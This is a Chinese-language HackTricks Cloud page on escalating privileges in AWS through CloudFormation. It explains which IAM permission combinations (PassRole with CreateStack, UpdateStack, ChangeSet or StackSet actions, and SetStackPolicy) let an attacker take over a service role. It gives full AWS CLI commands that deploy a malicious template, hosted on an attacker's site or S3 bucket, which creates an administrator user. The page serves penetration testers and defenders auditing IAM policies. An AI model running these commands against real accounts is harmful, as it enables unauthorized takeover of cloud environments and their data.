# AWS - Cloudformation特权升级

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## cloudformation

有关cloudformation的更多信息，请查看：

{% content-ref url="../../aws-services/aws-cloudformation-and-codestar-enum.md" %}
[aws-cloudformation-and-codestar-enum.md](../../aws-services/aws-cloudformation-and-codestar-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `cloudformation:CreateStack`

拥有**`iam:PassRole`**和**`cloudformation:CreateStack`**权限的攻击者可以通过创建一个CloudFormation模板来**升级特权**，该模板将使用在创建CloudFormation堆栈时传递的角色的**权限执行操作并创建资源**。
```bash
aws cloudformation create-stack --stack-name my_stack \
--template-url http://my-website.com/my-malicious-template.template \
--role-arn arn_of_cloudformation_service_role
```
在攻击者的网站上，模板包含执行恶意操作的指令，例如创建一个管理员用户，然后使用这些凭据来提升他们自己的访问权限。

在下面的页面中，您可以找到一个具有额外权限`cloudformation:DescribeStacks`的**利用示例**：

{% content-ref url="iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md" %}
[iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md](iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md)
{% endcontent-ref %}

**潜在影响：**提升到指定的cloudformation服务角色。 

### `iam:PassRole`, (`cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`)

在这种情况下，您可以滥用现有的cloudformation堆栈来更新它并提升权限，就像前面的情景中一样：
```bash
aws cloudformation update-stack \
--stack-name privesc \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::91029364722:role/CloudFormationAdmin2 \
--capabilities CAPABILITY_IAM \
--region eu-west-1
```
`cloudformation:SetStackPolicy`权限可用于在堆栈上**赋予自己`UpdateStack`权限**并执行攻击。

**潜在影响：**特权升级到指定的cloudformation服务角色。

### `cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`

如果您拥有此权限，但**没有`iam:PassRole`**，仍然可以**更新使用的堆栈**并滥用它们已经附加的**IAM角色**。查看前一节的漏洞示例（只是在更新中不指定任何角色）。

`cloudformation:SetStackPolicy`权限可用于在堆栈上**赋予自己`UpdateStack`权限**并执行攻击。

**潜在影响：**特权升级到已附加的cloudformation服务角色。

### `iam:PassRole`,((`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

具有**传递角色和创建执行ChangeSet的权限**的攻击者可以像使用CreateStack或UpdateStack一样，**创建/更新新的cloudformation堆栈并滥用cloudformation服务角色**。

以下漏洞是使用**ChangeSet权限**创建堆栈的[**CreateStack的变体**](./#iam-passrole-cloudformation-createstack)。
```bash
aws cloudformation create-change-set \
--stack-name privesc \
--change-set-name privesc \
--change-set-type CREATE \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::947247140022:role/CloudFormationAdmin \
--capabilities CAPABILITY_IAM \
--region eu-west-1

echo "Waiting 2 mins to change the stack"
sleep 120

aws cloudformation execute-change-set \
--change-set-name privesc \
--stack-name privesc \
--region eu-west-1

echo "Waiting 2 mins to execute the stack"
sleep 120

aws cloudformation describe-stacks \
--stack-name privesc \
--region eu-west-1
```
`cloudformation:SetStackPolicy`权限可用于在堆栈上**赋予自己`ChangeSet`权限**并执行攻击。

**潜在影响：**提升到cloudformation服务角色。

### (`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

这种方法与之前的方法类似，不需要传递**IAM角色**，因此您可以**滥用已附加的角色**，只需修改参数：
```
--change-set-type UPDATE
```
**潜在影响：**特权升级至已附加的CloudFormation服务角色。

### `iam:PassRole`，(`cloudformation:CreateStackSet` | `cloudformation:UpdateStackSet`)

攻击者可以利用这些权限创建/更新StackSets，以滥用任意的CloudFormation角色。

**潜在影响：**特权升级至CloudFormation服务角色。

### `cloudformation:UpdateStackSet`

攻击者可以滥用此权限（无需passRole权限）来更新StackSets，以滥用已附加的CloudFormation角色。

**潜在影响：**特权升级至已附加的CloudFormation角色。

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
